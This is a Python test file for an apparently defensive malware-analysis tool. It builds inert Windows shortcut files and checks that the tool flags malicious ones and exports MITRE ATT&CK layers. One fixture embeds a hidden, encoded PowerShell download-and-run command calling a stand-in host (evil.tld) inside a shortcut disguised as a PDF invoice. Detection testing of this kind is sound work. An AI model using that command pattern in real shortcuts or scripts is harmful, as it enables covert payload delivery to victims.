#!/usr/bin/env python3
"""
Laelaps LNK (Windows shortcut) analysis + ATT&CK Navigator export tests.

Weaponized .lnk files are a top initial-access vector: a shortcut that quietly
launches PowerShell/cmd to fetch and run a payload. These build inert shortcuts
(shell-link structure only, no payload) and assert Laelaps parses them, flags the
malicious ones, leaves a benign one clean, and emits a valid ATT&CK layer.

Fully offline. Run:  python3 tests/lnk_test.py
"""
import json
import os
import struct
import subprocess
import sys
import tempfile
import hashlib

os.environ["LAELAPS_OFFLINE"] = "1"
os.environ.pop("ANTHROPIC_API_KEY", None)
os.environ.pop("OPENAI_API_KEY", None)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import laelaps as L  # noqa: E402

checks = []


def check(name, cond, extra=""):
    ok = bool(cond)
    checks.append(ok)
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}{(' -> ' + extra) if extra and not ok else ''}")


def make_lnk(relpath, args, unicode=True, overlay=b""):
    """Build a minimal but valid Shell Link (.lnk): header + RELATIVE_PATH + ARGUMENTS."""
    flags = 0x08 | 0x20 | (0x80 if unicode else 0)   # HasRelativePath | HasArguments | IsUnicode
    hdr = struct.pack("<I", 0x4C) + bytes.fromhex("0114020000000000c000000000000046")
    hdr += struct.pack("<I", flags) + b"\x00" * 52    # remaining 52 bytes of the 76-byte header

    def sd(s):
        return struct.pack("<H", len(s)) + s.encode("utf-16-le" if unicode else "latin-1")

    return hdr + sd(relpath) + sd(args) + overlay


def hi_entropy(n):
    out = bytearray()
    s = b"seed"
    while len(out) < n:
        s = hashlib.sha256(s).digest()
        out += s
    return bytes(out[:n])


tmp = tempfile.mkdtemp(prefix="laelaps_lnk_")

print("=== malicious shortcut (encoded PowerShell downloader via cmd) ===")
mal = make_lnk(r"..\..\..\Windows\System32\cmd.exe",
               "/c powershell -w hidden -nop -enc SQBFAFgA http://evil.tld/a.ps1")
mp = os.path.join(tmp, "invoice.pdf.lnk")
open(mp, "wb").write(mal)
rep = L.analyze_file_v2(mp, use_llm=False)
lnk_titles = [s.title for s in rep.signals if s.engine == "deep:lnk"]
check("detected as a Windows shortcut", "shortcut" in rep.filetype.lower(), rep.filetype)
check("verdict is malicious or suspicious", rep.verdict in ("malicious", "suspicious"), rep.verdict)
check("LOLBin/interpreter launch flagged", any("LOLBin" in t or "interpreter" in t for t in lnk_titles))
check("encoded-PowerShell argument flagged", any("encoded" in t.lower() for t in lnk_titles))
check("MITRE includes command-exec + ingress", "T1059.001" in rep.mitre and "T1105" in rep.mitre,
      str(rep.mitre))

print("=== malicious shortcut with a smuggled overlay ===")
ov = make_lnk(r"..\..\..\Windows\System32\cmd.exe", "/c start payload",
              overlay=hi_entropy(8192))
op = os.path.join(tmp, "readme.txt.lnk")
open(op, "wb").write(ov)
repo = L.analyze_file_v2(op, use_llm=False)
check("trailing-overlay after shortcut flagged",
      any("Trailing data" in s.title for s in repo.signals if s.engine == "deep:lnk"))

print("=== benign shortcut (notepad, no arguments) ===")
ben = make_lnk(r"..\..\..\Windows\notepad.exe", "")
bp = os.path.join(tmp, "Notepad.lnk")
open(bp, "wb").write(ben)
repb = L.analyze_file_v2(bp, use_llm=False)
check("benign shortcut stays clean/unknown", repb.verdict in ("clean", "unknown"), repb.verdict)

print("=== analyze_lnk unit behavior ===")
check("analyze_lnk returns indicators for a malicious lnk", len(L.analyze_lnk(mal)) >= 2)
check("analyze_lnk returns nothing for non-lnk bytes", L.analyze_lnk(b"not a shortcut at all") == [])

print("=== ATT&CK Navigator layer ===")
layer = L.attack_navigator_layer(["T1059.001", "T1105", "T1027", "not-a-technique"], name="x")
ids = {t["techniqueID"] for t in layer["techniques"]}
check("layer domain is enterprise-attack", layer.get("domain") == "enterprise-attack")
check("layer has expected schema keys",
      all(k in layer for k in ("name", "versions", "techniques", "gradient")))
check("valid technique IDs kept, junk dropped",
      {"T1059.001", "T1105", "T1027"} <= ids and "not-a-technique" not in ids)

print("=== CLI: --attack-layer writes a usable file ===")
out = os.path.join(tmp, "layer.json")
r = subprocess.run([sys.executable, os.path.join(ROOT, "laelaps.py"), mp,
                    "--attack-layer", out, "--offline", "--report"],
                   capture_output=True, text=True)
wrote = os.path.isfile(out)
check("CLI wrote the layer file", wrote)
if wrote:
    j = json.load(open(out))
    check("CLI layer includes observed techniques",
          any(t["techniqueID"] == "T1059.001" for t in j.get("techniques", [])))
else:
    check("CLI layer includes observed techniques", False, "no file")

passed, total = sum(checks), len(checks)
print(f"\n=== {passed}/{total} checks passed ===")
sys.exit(0 if passed == total else 1)
